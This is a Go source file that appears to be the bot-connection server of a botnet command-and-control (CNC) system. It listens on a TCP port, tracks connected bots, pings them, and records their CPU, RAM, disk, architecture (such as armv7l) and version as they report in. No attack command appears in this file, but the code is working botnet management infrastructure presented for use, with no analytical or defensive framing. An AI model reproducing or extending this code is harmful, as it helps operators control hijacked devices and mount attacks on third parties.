package socket

import (
	"bufio"
	"cnc/lib/utils"
	"fmt"
	"net"
	"net/textproto"
	"strconv"
	"strings"
	"time"
)

func (b *Bot) PingThread() {
	for b.Network.Connected {
		_, err := b.Network.Socket.Write([]byte("ping\n"))

		if err != nil {
			b.Network.Connected = false
			break
		}

		time.Sleep(time.Second * 5)
	}
}

func (b *Bot) HandleConnection() {
	utils.Debug(fmt.Sprintf("[*] New bot connected --> %s", b.Network.Socket.RemoteAddr()))
	BotList = append(BotList, b)

	defer func() {
		utils.Log(fmt.Sprintf("[<-] Bot leaved (%s) | CPU: %d | RAM: %d | DISK: %s | ARCH: %s | VERSION: %s", b.Network.Socket.RemoteAddr(), b.Cpu, b.Mem, b.Disk, b.Arch, b.Version))
		b.Network.Socket.Close()
		RemoveBot(b)
	}()

	for b.Network.Connected {
		success, data := b.Input()

		if !success {
			b.Network.Connected = false
		}
		args := strings.Split(data, "|")

		// BOTINFO|4|3838|105|armv7l|0.0.2
		if args[0] == "BOTINFO" && len(args) == 6 {
			b.Cpu, _ = strconv.Atoi(args[1])
			b.Mem, _ = strconv.Atoi(args[2])
			b.Disk = args[3]
			b.Arch = args[4]
			b.Version = args[5]

			utils.Log(fmt.Sprintf("[->] New bot (%s) | CPU: %d | RAM: %d | DISK: %s | ARCH: %s | VERSION: %s", b.Network.Socket.RemoteAddr(), b.Cpu, b.Mem, b.Disk, b.Arch, b.Version))
		}
	}
}

func (b *Bot) Input() (bool, string) {
	content := ""

	for b.Network.Connected && content == "" {
		data, err := textproto.NewReader(bufio.NewReader(b.Network.Socket)).ReadLine()

		if data == "" {
			continue
		}

		if err != nil || !b.Network.Connected {
			return false, ""
		}

		content = string(data)
	}

	return true, content
}

func StartBotServer() {
	socket, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", utils.BotSocketPort))
	utils.HandleError(err)

	utils.Log(fmt.Sprintf("[*] [BOTS] Server open on port %d", utils.BotSocketPort))

	for {
		conn, err := socket.Accept()
		utils.HandleError(err)

		bot := Bot{
			Cpu:     0,
			Mem:     0,
			Disk:    "nan",
			Arch:    "nan",
			Version: "nan",
			Network: BotSocket{
				Connected: true,
				Socket:    conn,
			},
		}

		go bot.PingThread()
		go bot.HandleConnection()
	}
}
